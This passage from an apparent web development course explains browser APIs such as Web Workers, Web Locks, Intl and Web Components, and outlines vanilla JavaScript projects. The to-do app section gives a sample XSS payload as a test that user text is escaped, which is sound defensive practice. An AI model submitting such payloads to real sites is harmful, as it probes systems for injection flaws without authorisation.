**Resources**
- [MDN: Using the Web Animations API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Animations_API/Using_the_Web_Animations_API)
- [MDN: Element.animate()](https://developer.mozilla.org/en-US/docs/Web/API/Element/animate)
- [W3C: Web Animations](https://www.w3.org/TR/web-animations-1/)

### `requestIdleCallback` and `scheduler.postTask`

The main thread handles input, script, and rendering, so any task longer than about 50 ms delays the response to a click or keypress. Work that is not urgent (analytics, prefetching, warming a cache, processing a big list) should be scheduled so that it gives way to the user.

`requestIdleCallback(fn, { timeout })` runs `fn` when the browser has spare time at the end of a frame. The callback receives a deadline:

```js
const queue = [...jobs];

function work(deadline) {
  while (queue.length && (deadline.timeRemaining() > 0 || deadline.didTimeout)) {
    process(queue.shift());
  }
  if (queue.length) requestIdleCallback(work, { timeout: 2000 });
}
requestIdleCallback(work, { timeout: 2000 });
```

Do small units and check `timeRemaining()` between them. Without a `timeout` the callback may not run for seconds on a busy page. Do not change the DOM in an idle callback, since the frame has already been rendered and you would force another layout. Safari still does not ship `requestIdleCallback`, so feature-detect and fall back to `setTimeout`.

The Prioritized Task Scheduling API is the more capable successor. `scheduler.postTask(fn, { priority, signal, delay })` returns a promise and takes one of three priorities: `'user-blocking'`, `'user-visible'` (the default), or `'background'`. A `TaskController` can abort a task or change its priority later.

Its companion `scheduler.yield()` is the most useful piece day to day. Awaiting it pauses your function, lets the browser handle pending input and rendering, and then resumes your function ahead of other queued tasks:

```js
async function processAll(items) {
  for (const item of items) {
    process(item);
    await (globalThis.scheduler?.yield?.() ?? new Promise((r) => setTimeout(r)));
  }
}
```

As of late 2026 `scheduler.postTask` and `scheduler.yield` are in Chrome, Edge, and Firefox but not Safari, so the fallback in that example is required. Yielding per item is wasteful for tiny items; yield every few milliseconds of work instead. And if the work is pure computation with no DOM access, a Web Worker removes it from the main thread entirely, which beats any amount of scheduling.

**Try it:** Write a loop that blocks for two seconds and try to type in an input while it runs. Then break it up with the yielding helper above and compare the long tasks in a Performance panel recording.

**Resources**
- [MDN: Window.requestIdleCallback()](https://developer.mozilla.org/en-US/docs/Web/API/Window/requestIdleCallback)
- [MDN: Prioritized Task Scheduling API](https://developer.mozilla.org/en-US/docs/Web/API/Prioritized_Task_Scheduling_API)
- [web.dev: Optimize long tasks](https://web.dev/articles/optimize-long-tasks)

### Web Workers

A worker runs a script on a separate thread with its own event loop and global scope. It cannot touch the DOM, `window`, or `document`; it communicates with the page only by passing messages. That constraint is the point: heavy computation in a worker cannot block scrolling, typing, or animation on the main thread.

```js
// main.js
const worker = new Worker(new URL('./worker.js', import.meta.url), { type: 'module' });

worker.postMessage({ id: 1, numbers });
worker.addEventListener('message', (e) => render(e.data));
worker.addEventListener('error', (e) => console.error(e.message));

// worker.js
self.addEventListener('message', (e) => {
  const { id, numbers } = e.data;
  const result = expensiveStats(numbers);
  self.postMessage({ id, result });
});
```

The `new URL(..., import.meta.url)` form is what bundlers such as Vite recognise and rewrite; `type: 'module'` lets the worker use `import`.

Messages are copied with the structured clone algorithm. Plain objects, arrays, `Map`, `Set`, `Date`, typed arrays, `Blob`, and `File` are fine; functions, DOM nodes, and class prototypes are not (class instances arrive as plain objects). Copying a large buffer is itself costly, so **transfer** it instead. Ownership moves to the other side with no copy, and the sender's reference becomes unusable:

```js
worker.postMessage({ buffer }, [buffer]);   // buffer.byteLength is now 0 here
```

Inside a worker you do have `fetch`, IndexedDB, timers, `crypto`, WebSockets, and `OffscreenCanvas`. You do not have `localStorage`.

Practical points: creating a worker has a start-up cost, so create one and reuse it rather than spawning per task; correlate requests and responses with an id because messages are not a function call (the Comlink library wraps this in a promise-based proxy); call `worker.terminate()` to kill a runaway job; and the worker script must be same-origin. Workers help with CPU-bound work such as parsing, image processing, search indexing, and big sorts. They do not make network requests faster, and they cannot help when the bottleneck is DOM work, which must stay on the main thread.

Related types: a `SharedWorker` is shared by several tabs, and a service worker is a network proxy for offline support, with a different lifecycle.

**Try it:** Compute primes up to five million on the main thread while a CSS animation runs, and watch it freeze. Move the computation into a worker and confirm the animation stays smooth. Then send a 50 MB `ArrayBuffer` with and without transferring it and time both.

**Resources**
- [MDN: Using Web Workers](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers)
- [MDN: Transferable objects](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Transferable_objects)
- [web.dev: Use web workers to run JavaScript off the browser's main thread](https://web.dev/articles/off-main-thread)

### `BroadcastChannel` and Web Locks

Users open your app in several tabs, and each tab is a separate JavaScript world with its own memory. Two small APIs handle the coordination problems this causes. Both are scoped to the origin, work in workers as well as windows, and are available in all major browsers.

**`BroadcastChannel`** is publish and subscribe between same-origin contexts. Every context that opens a channel with the same name receives messages posted by the others.

```js
const channel = new BroadcastChannel('auth');

logoutButton.addEventListener('click', async () => {
  await logout();
  channel.postMessage({ type: 'logged-out' });
  showLoginScreen();
});

channel.addEventListener('message', (event) => {
  if (event.data.type === 'logged-out') showLoginScreen();
});
```

Messages are copied with structured clone, so objects, `Map`s, and `Blob`s work; functions and DOM nodes do not. The sender does not receive its own message, which is why the handler above calls `showLoginScreen()` directly as well. There is no history: a tab opened later sees nothing that was sent before it subscribed, so a new tab must load current state from storage or the server and use the channel only for changes. Call `channel.close()` when you are finished. It is a cleaner tool than the `storage` event trick, because it does not write anything to disk and can carry structured data.

**Web Locks** solve the opposite problem: work that must be done by only one tab at a time. `navigator.locks.request(name, callback)` queues for a named lock, runs the callback once it is granted, and holds the lock until the promise returned by the callback settles.

```js
async function refreshToken() {
  return navigator.locks.request('token-refresh', async () => {
    const cached = readToken();
    if (cached && !isExpired(cached)) return cached;   // another tab already did it
    const fresh = await requestNewToken();
    saveToken(fresh);
    return fresh;
  });
}
```

Without the lock, three tabs whose token expires at the same moment each send a refresh request, and with rotating refresh tokens two of them fail. With it, the first tab refreshes and the others wait, then find the new token. Re-checking state after acquiring the lock is the essential step.

Options: `mode: 'shared'` allows many readers while `'exclusive'` (the default) allows one holder; `ifAvailable: true` calls back immediately with `null` instead of waiting, for "skip if someone else is doing it"; and `signal` lets you give up waiting. A lock is released automatically if its tab closes or crashes, which is what makes the pattern robust. That also gives you leader election: each tab requests a lock and returns a promise that never resolves, so exactly one tab holds it and runs the polling or WebSocket connection, and another takes over the moment it closes.

Things to keep in mind: the API requires a secure context; hold locks briefly and never across user input; acquiring two locks in different orders in different tabs can deadlock; and the two APIs complement each other, with the lock deciding who does the work and the channel telling everyone else the result.

**Try it:** Open a page in three tabs. Use a `BroadcastChannel` so that changing a theme toggle in one updates the others. Then add a leader election lock and display "leader" or "follower" in each tab; close the leader and watch another tab take over. Inspect held and pending locks with `await navigator.locks.query()`.

**Resources**
- [MDN: Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API)
- [MDN: Web Locks API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Locks_API)
- [W3C: Web Locks API](https://www.w3.org/TR/web-locks/)

### Clipboard, Share, and Fullscreen APIs

These three hand control to the device, and they share the same preconditions: a secure context (HTTPS or localhost) and, for most calls, **transient user activation**, meaning the call must happen in or shortly after a handler for a real user gesture such as a click or key press. Call them from a timer or on page load and they reject.

**Clipboard.** `navigator.clipboard` is promise-based and replaces the deprecated `document.execCommand('copy')`.

```js
copyButton.addEventListener('click', async () => {
  try {
    await navigator.clipboard.writeText(codeBlock.textContent);
    status.textContent = 'Copied';          // announce in an aria-live region
  } catch {
    status.textContent = 'Copy failed. Select the text and press Ctrl+C.';
  }
});
```

Writing text is widely allowed after a gesture. Reading (`readText()`, `read()`) is more sensitive: browsers show a permission prompt or a paste confirmation. Rich content uses `ClipboardItem` with `write()`. If you only want to react to the user's own paste, listen for the `paste` event and read `event.clipboardData`; that needs no permission.

**Web Share.** `navigator.share({ title, text, url })` opens the operating system's share sheet. It is not available everywhere (notably missing from desktop Firefox), so feature-detect and offer a copy-link fallback. `navigator.canShare({ files })` tests whether file sharing will work. If the user dismisses the sheet the promise rejects with `AbortError`, which is not an error to report.

```js
if (navigator.share) {
  try { await navigator.share({ title: document.title, url: location.href }); }
  catch (err) { if (err.name !== 'AbortError') throw err; }
} else {
  await navigator.clipboard.writeText(location.href);
}
```

**Fullscreen.** `element.requestFullscreen()` returns a promise and makes that element fill the screen; `document.exitFullscreen()` leaves. `document.fullscreenElement` tells you the current element, the `fullscreenchange` event tells you when it changes, and the `:fullscreen` and `::backdrop` selectors let you style it. The user can always leave with Escape, so keep your UI state driven by the `fullscreenchange` event, not by your button clicks. Support on iPhone has historically been limited to video, so test there.

**Try it:** Build a "Share" button that uses `navigator.share` when present and falls back to copying the URL with a visible confirmation. Then call `navigator.clipboard.writeText` from a `setTimeout` of five seconds and read the rejection.

**Resources**
- [MDN: Clipboard API](https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API)
- [MDN: Navigator.share()](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/share)
- [MDN: Fullscreen API](https://developer.mozilla.org/en-US/docs/Web/API/Fullscreen_API)

### File handling

A `Blob` is an immutable chunk of binary data with a `size` and a MIME `type`. A `File` is a `Blob` with a `name` and `lastModified`. Files reach your code from an `<input type="file">` (`input.files`), from a drop (`event.dataTransfer.files`), or from a paste.

Read the contents with the promise methods on `Blob`: `await file.text()`, `await file.arrayBuffer()`, and `file.stream()` for large files. These have replaced `FileReader` for most purposes; you still need `FileReader` for `readAsDataURL` and for progress events on old code paths.

To preview or download a blob without reading it into memory, create an object URL:

```js
input.addEventListener('change', () => {
  const [file] = input.files;
  if (!file) return;
  if (!file.type.startsWith('image/') || file.size > 5 * 1024 * 1024) {
    return showError('Choose an image under 5 MB.');
  }
  const url = URL.createObjectURL(file);
  preview.onload = () => URL.revokeObjectURL(url);   // release the reference
  preview.src = url;
});
```

An object URL keeps the blob alive until the document unloads or you call `URL.revokeObjectURL`. Forgetting to revoke in a long-lived app that previews many files is a memory leak. The same technique downloads generated data: make a `Blob`, create a URL, and click an `<a download="report.csv">` pointing at it.

For drag and drop, the non-obvious requirement is that you must cancel `dragover` for the element to become a valid drop target; otherwise `drop` never fires and the browser navigates to the file.

```js
zone.addEventListener('dragover', (e) => e.preventDefault());
zone.addEventListener('drop', (e) => {
  e.preventDefault();
  handleFiles([...e.dataTransfer.files]);
});
```

Things to keep in mind: `file.type` is guessed from the file extension and is trivially spoofed, so the server must validate uploads regardless; a drop zone is not keyboard accessible, so always pair it with a real file input; `accept="image/*"` on the input is a hint, not enforcement; and the same file selected twice does not fire `change` unless you reset `input.value = ''`. Upload with `FormData` (`formData.append('file', file)`). `file.slice(start, end)` gives a cheap view for chunked uploads.

**Try it:** Build a drop zone plus file input that shows image thumbnails via object URLs and revokes them on load. Add a button that generates a CSV string and downloads it through a `Blob`.

**Resources**
- [MDN: Using files from web applications](https://developer.mozilla.org/en-US/docs/Web/API/File_API/Using_files_from_web_applications)
- [MDN: URL.createObjectURL()](https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL_static)
- [MDN: File drag and drop](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Drag_and_Drop_API/File_drag_and_drop)

### Geolocation, notifications, permissions

Powerful features sit behind a permission the user grants per origin. The state is one of `'granted'`, `'denied'`, or `'prompt'`. All of these APIs require a secure context.

**Geolocation** prompts on first use:

```js
navigator.geolocation.getCurrentPosition(
  (pos) => showNearby(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
  (err) => {
    // err.code: 1 PERMISSION_DENIED, 2 POSITION_UNAVAILABLE, 3 TIMEOUT
    showManualLocationInput();
  },
  { enableHighAccuracy: false, timeout: 10_000, maximumAge: 60_000 },
);
```

It is callback-based, not promise-based. Always pass the error callback and a `timeout`, since the default is to wait forever. `accuracy` is in metres and can be thousands on a desktop using IP or Wi-Fi location. `watchPosition` gives continuous updates; stop it with `clearWatch`. `enableHighAccuracy` costs battery.

**Notifications** require an explicit request: `const result = await Notification.requestPermission()`, then `new Notification('Build finished', { body: '…' })` while the page is open. Notifications that arrive when the page is closed need a service worker and the Push API.

**Permissions API.** `await navigator.permissions.query({ name: 'geolocation' })` returns a status object with `state` and a `change` event, letting you adapt the UI without triggering a prompt. The set of queryable names varies by browser, so wrap it in `try`/`catch`.

Requesting responsibly is mostly about timing:

1. Never prompt on page load. The user has no context and will block, and Chrome quietens prompts on sites where users usually deny.
2. Ask in response to a user action that makes the benefit obvious: a "Use my location" button, or "Notify me when this is back in stock".
3. If it is not self-evident, explain in your own UI first, then trigger the browser prompt.
4. Treat denial as normal. A `'denied'` state is effectively permanent: you cannot re-prompt, and only the user can reset it in site settings. Provide an alternative path, such as a postcode field.
5. Call `requestPermission` and other prompts from a user gesture; some browsers ignore them otherwise.

**Try it:** Build a store-locator stub with a "Use my location" button and a manual postcode fallback. Use the DevTools Sensors drawer to fake a location, then block the permission in site settings and confirm the fallback appears without errors.

**Resources**
- [MDN: Using the Geolocation API](https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API/Using_the_Geolocation_API)
- [MDN: Using the Notifications API](https://developer.mozilla.org/en-US/docs/Web/API/Notifications_API/Using_the_Notifications_API)
- [web.dev: Web permissions best practices](https://web.dev/articles/permissions-best-practices)

### `Intl`

`Intl` is the built-in internationalisation library. It formats and compares values according to a locale's conventions using data shipped with the browser, so you need no formatting library and no locale files for the common cases.

```js
const locale = navigator.language;      // or undefined for the default

new Intl.DateTimeFormat(locale, { dateStyle: 'medium', timeStyle: 'short' })
  .format(new Date());                   // "4 Oct 2026, 14:30" in en-GB

new Intl.NumberFormat('de-DE', { style: 'currency', currency: 'EUR' })
  .format(1234.5);                       // "1.234,50 €"

new Intl.NumberFormat('en', { notation: 'compact' }).format(15300);   // "15K"
new Intl.NumberFormat('en', { style: 'unit', unit: 'kilometer-per-hour' }).format(50);

new Intl.RelativeTimeFormat('en', { numeric: 'auto' }).format(-1, 'day'); // "yesterday"

new Intl.ListFormat('en', { type: 'conjunction' })
  .format(['HTML', 'CSS', 'JS']);        // "HTML, CSS, and JS"

new Intl.PluralRules('en').select(1);    // "one"; use it to pick message variants
```

Also worth knowing: `Intl.Collator` for locale-correct sorting (`items.sort(new Intl.Collator(locale, { numeric: true }).compare)` sorts "item 2" before "item 10" and handles accents properly), `Intl.Segmenter` for splitting text into graphemes, words, or sentences, `Intl.DisplayNames` for names of languages and regions, and `Intl.DurationFormat` for durations like "1 hr, 30 min".

How to use it well:

- Pass `undefined` or `navigator.languages` as the locale to respect the user. Hard-coding `'en-US'` defeats the purpose.
- Constructing a formatter is expensive; calling `format` is cheap. Create it once and reuse it. `date.toLocaleDateString()` in a loop builds a new formatter every time.
- `RelativeTimeFormat` does not choose the unit. You compute the difference and decide whether it is seconds, hours, or days.
- Pass `timeZone` explicitly (for example `'UTC'`) when the output must not depend on the viewer's zone.
- `formatToParts()` returns typed pieces when you need to style the currency symbol or assemble custom output.
- The output is for humans. Never parse it, and do not assert exact strings in tests: results vary between browsers and data versions, and can include non-obvious characters such as the narrow no-break space (U+202F) before "PM".
- A server and a browser may format differently, causing hydration mismatches in server-rendered apps.

**Try it:** Write `timeAgo(date)` that picks the largest sensible unit and formats with `Intl.RelativeTimeFormat`. Then format one price and one date in `en-US`, `de-DE`, `ja-JP`, and `ar-EG` and compare the output.

**Resources**
- [MDN: Intl](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl)
- [MDN: Intl.DateTimeFormat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat)
- [ECMA-402: ECMAScript Internationalization API Specification](https://tc39.es/ecma402/)

### Web Components

Web Components are three browser features that together let you define your own HTML elements, which work in any page or framework.

**Custom elements** register a class for a tag name. The name must contain a hyphen. **Shadow DOM** attaches a private subtree whose markup is hidden from `document.querySelector` and whose styles do not leak in or out. **Slots** are placeholders in the shadow tree where the element's ordinary (light DOM) children are displayed.

```js
class UserCard extends HTMLElement {
  static observedAttributes = ['name'];

  constructor() {
    super();
    this.attachShadow({ mode: 'open' }).innerHTML = `
      <style>
        :host { display: block; border: 1px solid #ccc; padding: 1rem; }
        h2 { margin: 0; color: var(--card-accent, inherit); }
      </style>
      <h2></h2>
      <slot>No bio provided.</slot>
      <slot name="actions"></slot>`;
  }

  connectedCallback() { this.#render(); }
  attributeChangedCallback() { this.#render(); }

  #render() {
    this.shadowRoot.querySelector('h2').textContent = this.getAttribute('name') ?? '';
  }
}
customElements.define('user-card', UserCard);
```

```html
<user-card name="Ada">
  <p>Wrote the first program.</p>
  <button slot="actions">Follow</button>
</user-card>
```

Lifecycle: the `constructor` runs on creation and must not read attributes or children, which may not exist yet. `connectedCallback` runs each time the element is inserted, which can be more than once, and `disconnectedCallback` each time it is removed, so set up and tear down listeners symmetrically. `attributeChangedCallback` fires only for names in `observedAttributes`.

What shadow DOM does and does not isolate: outside selectors cannot reach in and inner selectors cannot reach out, but inherited properties (`color`, `font`) and CSS custom properties cross the boundary. Custom properties and `::part()` are how you expose a styling API. Slotted content stays in the light DOM and is styled by the page. Events from inside are retargeted to the host, and custom events need `composed: true` to escape.

Accessibility needs care, because ID references such as `aria-labelledby` and `<label for>` do not cross shadow boundaries. Use real `<button>` and `<input>` elements internally, and `ElementInternals` (`this.attachInternals()`) for form participation and default ARIA semantics.

Elements are upgraded when their definition loads, so style the gap with `user-card:not(:defined)`. Declarative shadow DOM (`<template shadowrootmode="open">`) lets the server send the shadow tree as HTML. In practice many teams author components with Lit, which adds reactive rendering on these same standards.

**Try it:** Build `<toggle-button>` with a shadow DOM `<button>`, a reflected `pressed` attribute, and a bubbling, composed `toggle` event. Use it twice on a page and try to style its inner button from the page stylesheet.

**Resources**
- [MDN: Web Components](https://developer.mozilla.org/en-US/docs/Web/API/Web_components)
- [HTML Standard: Custom elements](https://html.spec.whatwg.org/multipage/custom-elements.html)
- [web.dev: Custom element best practices](https://web.dev/articles/custom-elements-best-practices)

### Vanilla to-do app

This project exercises most of the module at once, and how you structure it matters more than getting it to work. The pattern to adopt is one-way data flow: a single state object is the truth, every user action updates state, and a `render()` function makes the DOM match it. Do not read state back out of the DOM.

```js
let state = { todos: load('todos', []), filter: 'all' };

function setState(patch) {
  state = { ...state, ...patch };
  save('todos', state.todos);
  render();
}
```

Suggested build order:

1. Static HTML first: a `<form>` with a labelled input, a `<ul>`, filter controls, and a `<template>` for a row.
2. Add via the form's `submit` event (so Enter works), with `crypto.randomUUID()` for ids.
3. One delegated listener on the list for toggle, delete, and edit, using `data-action` and `closest`.
4. Filters as real links (`#/active`, `#/completed`) or radio buttons, so the filter is keyboard operable for free.
5. Persistence with defensive `JSON.parse`.
6. Inline editing: double-click or an Edit button swaps the label for an input; Enter saves, Escape cancels, blur saves.

"Fully keyboard operable" is the hard requirement. Use native `<button>`, `<input type="checkbox">`, and `<label>` elements rather than clickable `<div>`s, and every control is focusable and operable without extra code. The part people miss is focus management: after deleting an item, the focused button no longer exists, and focus falls back to `<body>`. Move it deliberately to the next item or the new-todo input. If you re-render the list by replacing all nodes, you destroy focus and any in-progress edit on every change, so either update only the affected row or save and restore focus by item id. Announce changes ("3 items left") in an `aria-live="polite"` region.

Render all user text with `textContent`. A to-do titled `<img src=x onerror=alert(1)>` is your XSS test.

**Try it:** Unplug your mouse and complete this script: add three items, edit the second, complete the first, filter to Active, delete an item, reload. At every step you should be able to see where focus is.

**Resources**
- [MDN: Window.localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)
- [WAI-ARIA Authoring Practices: Developing a keyboard interface](https://www.w3.org/WAI/ARIA/apg/practices/keyboard-interface/)
- [TodoMVC: the reference app spec and implementations](https://todomvc.com/)

### API explorer

The goal is a search UI that behaves correctly under real network conditions. Model it as a state machine with exactly one status at a time, and derive the whole view from it:

| Status | Shown |
| --- | --- |
| `idle` | A prompt to start typing |
| `loading` | A spinner or skeleton; previous results may stay, dimmed |
| `success` | The results |
| `empty` | "No results for X" |
| `error` | A message and a Retry button |

Keeping these as one `status` value, rather than separate `isLoading`, `hasError`, and `results` flags, makes impossible combinations (loading and error at once) unrepresentable.

The core is three techniques working together. **Debounce** the `input` event by 250 to 300 ms so you do not request on every keystroke. **Abort** the previous request whenever a new one starts, so a slow early response cannot overwrite a newer one. **Check `res.ok`** so HTTP errors reach your error state.

```js
let timer, controller;

input.addEventListener('input', () => {
  clearTimeout(timer);
  timer = setTimeout(() => search(input.value.trim()), 300);
});

async function search(q) {
  controller?.abort();
  if (!q) return setState({ status: 'idle' });
  controller = new AbortController();
  setState({ status: 'loading' });
  try {
    const url = new URL('https://api.github.com/search/repositories');
    url.searchParams.set('q', q);
    const res = await fetch(url, { signal: controller.signal });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const { items } = await res.json();
    setState(items.length ? { status: 'success', items } : { status: 'empty', q });
  } catch (err) {
    if (err.name !== 'AbortError') setState({ status: 'error', err });
  }
}
```

Finishing touches that separate a good version: mirror the query into the URL with `history.replaceState` so results are shareable and survive reload; handle rate limiting (GitHub's unauthenticated search returns 403 or 429 quickly) with a specific message; put results in a region with `aria-live="polite"` and `aria-busy` while loading; wrap the input in a `<form role="search">` and handle `submit` to search immediately; and render every API string with `textContent`. Pick any public, CORS-enabled API that needs no key.

**Try it:** Throttle to Slow 4G and type a word quickly: the Network panel should show cancelled requests and only the last result rendered. Then switch to Offline and verify the error state and that Retry works once you are back online.

**Resources**
- [MDN: Using the Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch)
- [MDN: AbortController](https://developer.mozilla.org/en-US/docs/Web/API/AbortController)
- [GitHub Docs: REST API endpoints for search](https://docs.github.com/en/rest/search/search)

### Vanilla SPA router

A client-side router maps the current URL to a view and keeps the two in sync without full page loads. Building one shows you exactly what React Router, Vue Router, and framework file-based routing do for you.

Start with a route table and a matcher that supports parameters. `URLPattern` is available in all major browsers and saves you writing regular expressions:

```js
const routes = [
  { pattern: new URLPattern({ pathname: '/' }), view: homeView },
  { pattern: new URLPattern({ pathname: '/users/:id' }), view: userView },
];

function resolve(url) {
  for (const { pattern, view } of routes) {
    const match = pattern.exec(url);
    if (match) return () => view(match.pathname.groups);
  }
  return notFoundView;
}
```

Then wire up the three entry points described under the History API entry: the initial load, intercepted link clicks (followed by `pushState`), and `popstate`. All three call one `navigate(url)` function that resolves the route and renders into an outlet element.

The parts that make it a real router:

- **Server fallback.** Every route must return `index.html`, or a reload on `/users/7` is a 404. With Vite's dev server this works by default; with `npx serve` use the `--single` flag. Use absolute asset paths so nested routes do not break relative URLs.
- **Link hygiene.** Skip interception for modified clicks, non-primary buttons, `target="_blank"`, `download`, and other origins.
- **Async views and races.** If a view fetches data, a second navigation can finish before the first. Give each navigation an `AbortController` and abort the previous one.
- **Accessibility.** A full page load resets focus and announces the new title; you must do both: set `document.title`, then move focus to the new view's `<h1>` (give it `tabindex="-1"`) or a wrapper.
- **Scroll.** Scroll to top on new navigations; on Back/Forward let the browser restore position, or manage it with `history.scrollRestoration = 'manual'`.
- **A 404 view** for unmatched paths, and `aria-current="page"` on the active link.

Once it works, port it to the Navigation API's `navigate` event as a second version; link interception, `popstate`, and abort handling collapse into one handler.

**Try it:** Verify your router against this list: click a link, Back, Forward, reload on a parameterised route, Ctrl/Cmd-click a link, navigate twice quickly to slow views, and tab after a navigation to see where focus is.

**Resources**
- [MDN: Working with the History API](https://developer.mozilla.org/en-US/docs/Web/API/History_API/Working_with_the_History_API)
- [MDN: URL Pattern API](https://developer.mozilla.org/en-US/docs/Web/API/URL_Pattern_API)
- [Chrome for Developers: Modern client-side routing: the Navigation API](https://developer.chrome.com/docs/web-platform/navigation-api)

### Infinite image gallery

The gallery loads a page of images, and loads the next page when the user nears the end. The clean way to detect "near the end" is a sentinel: an empty element after the grid, watched by an `IntersectionObserver` with a generous `rootMargin` so loading starts before the user arrives.

```js
let page = 1, loading = false, done = false;

const observer = new IntersectionObserver(async ([entry]) => {
  if (!entry.isIntersecting || loading || done) return;
  loading = true;
  try {
    const res = await fetch(`https://picsum.photos/v2/list?page=${page}&limit=30`);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const photos = await res.json();
    if (photos.length === 0) { done = true; observer.disconnect(); return; }
    grid.append(...photos.map(card));
    page += 1;
  } catch (err) {
    showRetry(err);
  } finally {
    loading = false;
  }
}, { rootMargin: '600px 0px' });

observer.observe(sentinel);
```

The `loading` guard is essential, because the observer can fire again while a request is in flight. Also handle the case where the first page does not fill the viewport: the sentinel stays intersecting, so no new crossing occurs and no callback fires. After appending, check again, or unobserve and re-observe the sentinel to force a fresh notification.

For the images themselves:

- Set `width` and `height` attributes (or CSS `aspect-ratio`) on every `<img>` so space is reserved before the image loads. Without this the grid jumps as images arrive, which shows up as layout shift.
- Use `loading="lazy"` and `decoding="async"`. Native lazy loading handles off-screen images for you. Implementing it by hand with a second observer and `data-src` is a worthwhile exercise, but the attribute is what you would ship.
- Request appropriately sized images, not full-resolution originals, and provide meaningful `alt` text.

Infinite scroll has real costs you should address: keyboard and screen reader users can never reach a footer, so offer a "Load more" button as an alternative or fallback; the DOM grows without bound, so for very long lists consider `content-visibility: auto` or virtualisation; and Back navigation loses the user's place unless you persist the page count and scroll position. Show a loading indicator, an end-of-list message, and a retry control on failure.

**Try it:** Open the Network panel filtered to Img and scroll slowly: image requests should begin shortly before each row enters view. Record with the Performance panel and confirm there are no layout shifts as images load.

**Resources**
- [MDN: Intersection Observer API](https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API)
- [web.dev: Browser-level image lazy loading](https://web.dev/articles/browser-level-image-lazy-loading)
- [MDN: Lazy loading](https://developer.mozilla.org/en-US/docs/Web/Performance/Guides/Lazy_loading)
